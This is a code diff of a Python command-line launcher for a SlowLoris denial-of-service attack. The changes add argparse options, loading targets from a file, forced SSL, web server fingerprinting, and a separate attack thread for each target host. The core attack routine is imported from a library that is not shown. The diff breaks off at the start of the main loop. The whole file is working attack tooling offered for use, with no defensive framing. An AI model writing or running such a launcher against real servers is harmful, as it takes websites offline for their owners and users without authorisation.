@@ -1,66 +1,87 @@
 """This module implements the SlowLoris DoS attack."""
 
 # Standard imports
-from os import path
-import sys
+import re
 import threading
 import time
+import argparse
 
 # Library imports
-from slow_loris import *
+from slow_loris import LorisClient, TargetInfo, try_detect_webserver
 
 # Constants
 DEFAULT_PORT = 80
 DEFAULT_CONNECTION_COUNT = 200
 
-def parsetarget(target):
+def parse_target(target):
     """Parses a target."""
-    parts = target.split()
-    part_len = len(parts)
-    host = parts[0]
-    port = DEFAULT_PORT
-    count = DEFAULT_CONNECTION_COUNT
-    if part_len == 2:
-        port = int(parts[1])
-    elif part_len == 3:
-        port = int(parts[1])
-        count = int(parts[2])
-    return TargetInfo(host, port, count)
+    pat = re.compile(r"(?P<host>(?:\w|\.)+)(\:(?P<port>\d+))?")
+    mat = pat.match(target)
+    host, port = (mat.group("host"), mat.group("port"))
+    port = 80 if port is None else int(port)
+    ssl = port == 443
+    print("Host: {}; Port: {}".format(host, port))
+    return TargetInfo(host, port, ssl)
+
+def parse_target_file(path):
+    """Parses a target file."""
+    with open(path) as file:
+        return [parse_target(line.strip()) for line in file.readlines()]
 
 def main():
     """The main entry point."""
-    if len(sys.argv) == 1:
-        print("Error! Expected at least one argument after file path!")
+    # Parse arguments
+    parser = argparse.ArgumentParser(description="Launch a SlowLoris attack.")
+    parser.add_argument("target",
+                        type=str,
+                        help="the target of the attack",
+                        nargs="?")
+    parser.add_argument("-f", "--file",
+                        type=str,
+                        dest="target_file",
+                        metavar="target_file",
+                        help="load targets from file")
+    parser.add_argument("--ssl",
+                        dest="force_ssl",
+                        action="store_true",
+                        help="force SSL connection")
+    parser.set_defaults(force_ssl=False)
+    args = parser.parse_args()
+    # Validate arguments
+    if args.target is None and args.target_file is None:
+        print("Error! Expected either a target or a target file.")
+        parser.print_help()
         exit()
-    # Holds a list of tuples in format (ip, port, count).
+    elif args.target is not None and args.target_file is not None:
+        print("Error! Expected either a target or a target file, not both.")
+        parser.print_help()
+        exit()
     targets = []
-    # If the user gave us a file, hit all of the targets within.
-    if path.isfile(sys.argv[1]):
-        with open(sys.argv[1]) as file:
-            lines = file.readlines()
-        lines = [line.strip() for line in lines]
-        for line in lines:
-            targets.insert(0, parsetarget(line))
+    if args.target is not None:
+        targets.append(parse_target(args.target))
     else:
-        targets.insert(0, parsetarget(' '.join(sys.argv[1:])))
-    # Begin attacking our selected targets.
+        targets = parse_target_file(args.target_file)
+    # Start the attack(s)
     print("Press Ctrl+C to stop all attacks instantly.")
     print("The servers will be up again as soon as the attacks stop.")
     try:
-        loris = SlowLoris()
-        # Spawn a new daemon thread for each attacker,
-        # as it takes time to establish all the connections.
+        loris = LorisClient()
+        # Iterate over all targets
         for target in targets:
+            # Force SSL if ssl command-line switch is present
+            target.ssl = True if args.force_ssl else target.ssl
+            # Try detecting the webserver running on the host
             web_server = try_detect_webserver(target)
             if web_server != None:
                 if web_server.startswith("Apache"):
                     print("[{}] Server is running Apache.".format(target.host))
                 else:
                     print("[{}] Server is running {}.".format(target.host, web_server))
+            # Spawn the attacking thread
             attack_thread = threading.Thread(
                 target=loris.attack,
                 args=[target])
-            attack_thread.setDaemon(True)
+            attack_thread.daemon = True
             attack_thread.start()
             time.sleep(0.5)
         while True:
